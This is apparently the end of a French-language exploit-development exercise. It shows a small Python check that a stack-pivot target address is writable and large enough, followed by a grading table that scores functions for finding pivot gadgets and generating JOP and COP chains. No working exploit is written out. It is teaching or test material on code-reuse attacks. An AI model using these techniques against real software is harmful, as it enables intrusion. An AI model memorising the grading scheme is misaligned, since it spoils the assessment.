def safe_pivot(target_addr, size_needed):
    assert is_writable(target_addr)
    assert get_region_size(target_addr) >= size_needed
```

---

## Barème de Notation

| Critère | Points |
|---------|--------|
| find_pivot_gadgets | 25 |
| calculate_pivot_setup | 25 |
| analyze_pivot_constraints | 20 |
| generate_jop_chain | 15 |
| generate_cop_chain | 15 |
| **Total** | **100** |
